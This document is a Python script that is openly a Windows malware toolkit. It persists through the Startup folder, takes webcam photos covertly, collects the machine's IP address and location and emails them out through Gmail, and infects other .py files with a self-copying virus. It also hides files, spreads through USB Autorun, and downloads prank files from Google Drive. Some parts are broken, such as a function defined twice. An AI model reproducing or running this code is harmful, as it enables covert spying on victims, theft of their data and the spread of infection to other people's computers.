import shutil
import os
from tkinter import Label

import pygame
import pygame.camera
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import time
import smtplib
from email.message import EmailMessage
import imghdr
import playsound
from google_drive_downloader import GoogleDriveDownloader as gdd
import ctypes
import socket
import glob
import geocoder
import datetime
import pathlib

def cts(name_of_file):
    startup=os.path.expanduser('~')+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    file_location=os.getcwd()+name_of_file
    shutil.copy(file_location, startup)


def ctl(name_of_file,copy_to):
    file_location=os.getcwd()+name_of_file
    shutil.copy(file_location, copy_to)


def ctus(name_of_file):
    user=os.path.expanduser('~')
    file_location=os.getcwd()+name_of_file
    shutil.copy(file_location, user)


def cts_r(name_of_file):
    startup=os.path.expanduser('~')+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    file_location=os.getcwd()+name_of_file
    shutil.copy(file_location, startup)
    os.remove(file_location)


def ctl_r(name_of_file,copy_to):
    file_location=os.getcwd()+name_of_file
    shutil.copy(file_location, copy_to)
    os.remove(file_location)


def ctus_r(name_of_file):
    user=os.path.expanduser('~')
    file_location=os.getcwd()+name_of_file
    shutil.copy(file_location, user)
    os.remove(file_location)


def Paste_In_To_Startup():
    user=os.path.expanduser('~')
    startup=os.path.expanduser('~')+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    cts(__file__)



def Web_Cam_Photo():
    pygame.camera.init()
    camlist = pygame.camera.list_cameras()
    if camlist:
        cam = pygame.camera.Camera(camlist[0], (640, 480))
        cam.start()
        image = cam.get_image()
        pygame.image.save(image, "webcam.jpg")
    P_file_location=os.getcwd()+ '\webcam.jpg'
    ctus_r(P_file_location)


def Log_IN_To_Email(gmailId, passWord):
    
    try:
        driver = webdriver.Chrome(ChromeDriverManager().install())
        driver.get(r'https://accounts.google.com/signin/v2/identifier?continue='+\
        'https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1'+\
        '&flowName=GlifWebSignIn&flowEntry = ServiceLogin')
        driver.implicitly_wait(15)
    
        loginBox = driver.find_element_by_xpath('//*[@id ="identifierId"]')
        loginBox.send_keys(gmailId)
    
        nextButton = driver.find_elements_by_xpath('//*[@id ="identifierNext"]')
        nextButton[0].click()
    
        passWordBox = driver.find_element_by_xpath(
            '//*[@id ="password"]/div[1]/div / div[1]/input')
        passWordBox.send_keys(passWord)
    
        nextButton = driver.find_elements_by_xpath('//*[@id ="passwordNext"]')
        nextButton[0].click()
    except:
        time.sleep(1)


def SWCPE(Subject, Send_From, PassWord, Send_to):
    msg=EmailMessage()
    msg['Subject']=Subject
    msg['From']=Send_From
    msg['To']=Send_to
    msg.set_content('')
    
    Copy_to=os.path.expanduser('~')

    Picture_location=Copy_to + '/webcam.jpg'

    with open(Picture_location, 'rb') as f:
        file_data=f.read()
        file_type=imghdr.what(f.name)
        file_name=f.name

    msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name )

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Send_From, PassWord)

        smtp.send_message(msg)


def SPCLE(Subject, Send_From, PassWord, Send_to):
    msg=EmailMessage()
    msg['Subject']=Subject
    msg['From']=Send_From
    msg['To']=Send_to
    msg.set_content('')
    
    Copy_to=os.path.expanduser('~')

    PCLocation_location=Copy_to + 'Location.txt'

    with open(PCLocation_location, 'rb') as f:
        file_data=f.read()
        file_type=imghdr.what(f.name)
        file_name=f.name

    msg.add_attachment(file_data, maintype='text', subtype=file_type, filename=file_name )

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Send_From, PassWord)

        smtp.send_message(msg)


def SPCLE(Subject, Send_From, PassWord, Send_to):
    msg=EmailMessage()
    msg['Subject']=Subject
    msg['From']=Send_From
    msg['To']=Send_to
    msg.set_content('')
    
    Copy_to=os.path.expanduser('~')

    PCLocation_location=Copy_to + 'Ip.txt'

    with open(PCLocation_location, 'rb') as f:
        file_data=f.read()
        file_type=imghdr.what(f.name)
        file_name=f.name

    msg.add_attachment(file_data, maintype='text', subtype=file_type, filename=file_name )

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Send_From, PassWord)

        smtp.send_message(msg)


def Log_Out_Of_Email():
    import webbrowser
    webbrowser.open('https://mail.google.com/mail/u/0/?logout&hl=en', new=2)


def Infect_Files():
    def find_files_to_infect(directory = "."):
        return [file for file in glob.glob("*.py")]

    def get_content_of_file(file):
        data = None
        with open(file, "r") as my_file:
            data = my_file.readlines()
        return data
    
    def get_content_if_infectable(file):
        data = get_content_of_file(file)
        for line in data:
            if "# begin-virus" in line:
                return None
        return data

    def infect(file, virus_code):
        if (data:=get_content_if_infectable(file)):
            with open(file, "w") as infected_file:
                infected_file.write("".join(virus_code))
                infected_file.writelines(data)

    def get_virus_code():

        virus_code_on = False
        virus_code = []

        code = get_content_of_file(__file__)

        for line in code:
            if "# begin-virus\n" in line:
                virus_code_on = True

            if virus_code_on:
                virus_code.append(line)

            if "# end-virus\n" in line:
                virus_code_on = False
                break

        return virus_code

    def summon_chaos():
        # the virus payload
        print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

    try:
        # retrieve the virus code from the current infected script
        virus_code = get_virus_code() 

        # look for other files to infect
        for file in find_files_to_infect():
            infect(file, virus_code)

        # call the payload
        summon_chaos()

    finally:
        # delete used names from memory
        for i in list(globals().keys()):
            if(i[0] != '_'):
                exec('del {}'.format(i))

        del i


def You_are_an_idiot():
    path=os.path.expanduser('~')
    You_are_an_idiot_path=os.path.expanduser('~')+'\you-are-an-idiot.mp3'
    gdd.download_file_from_google_drive(file_id='1e8a07JDssnLqGiZNRQQWGrTGuPKmwvoJ', dest_path=path, unzip=True)
    playsound(You_are_an_idiot_path)


def Chage_Background(file_id, file_name):
    path=os.path.expanduser('~')
    Rad_Background_path=os.path.expanduser('~')+file_name
    gdd.download_file_from_google_drive(file_id, dest_path=path, unzip=True)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, Rad_Background_path , 0)


def Get_Ip():
    path_of_IpTxT=os.getcwd()+'\Ip.txt'
    Ip=socket.gethostbyname(socket.gethostname())
    Copy_ip_to=os.path.expanduser('~')
    f=open('Ip.txt', "w+")
    f.write(Ip)
    f.close()
    ctus_r(path_of_IpTxT)


def Pc_location():
    g = geocoder.ip('me')
    path_of_locationTxT=os.getcwd()+'\Location.txt'
    Copy_ip_to=os.path.expanduser('~')
    f=open('Location.txt', "w+")
    f.write(g)
    f.close()
    ctus_r(path_of_locationTxT)
    

def Hide_file():
    try:
        os.system( "attrib +h /s /d" )
    except OSError:
        pass


def Paste_To_USB(file_to_open_name):
    Open='open='+file_to_open_name+'.exe'
    Action='Start'+file_to_open_name
    icon=file_to_open_name+'.exe'
    file = pathlib.Path('E:/Autorun.txt')
    if file.exists ():  
        try:
            shutil.copy(__file__, 'E:/')
            f=open('Autorun.txt', 'w+')
            f.write('[Autorun]')
            f.write(Open)
            f.write(Action)
            f.write('Label=My virus')
            f.write(icon)
            f.close
        except:
            pass


